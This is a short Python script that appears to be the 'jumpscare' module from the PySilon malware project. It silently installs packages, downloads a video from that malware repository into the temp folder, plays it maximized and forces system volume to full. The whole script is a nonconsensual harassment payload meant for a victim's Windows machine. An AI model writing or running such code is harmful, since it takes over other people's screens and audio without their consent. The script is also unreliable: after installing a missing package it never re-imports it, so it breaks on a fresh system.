import os
import subprocess
import sys
import time
import requests
from ctypes import cast, POINTER  # Ensure cast and POINTER are imported

# Function to install a package if it's not already installed
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Automatically install dependencies if they are not already installed
try:
    import win32gui
    import win32con
except ImportError:
    print("win32gui and win32con not found, installing...")
    install("pywin32")

try:
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except ImportError:
    print("pycaw not found, installing...")
    install("pycaw")

try:
    from comtypes import CLSCTX_ALL
except ImportError:
    print("comtypes not found, installing...")
    install("comtypes")

# Trigger jumpscare
devices = AudioUtilities.GetSpeakers()  # Ensure this import works
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))  # Ensure 'cast' is used correctly

video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"

temp_folder = os.environ['TEMP']
temp_file = os.path.join(temp_folder, 'jumpscare.mp4')

if not os.path.exists(temp_file):
    response = requests.get(video_url)
    with open(temp_file, 'wb') as file:
        file.write(response.content)

time.sleep(1)
os.startfile(temp_file)
time.sleep(0.6)
get_video_window = win32gui.GetForegroundWindow()
win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
volume.SetMasterVolumeLevelScalar(1.0, None)
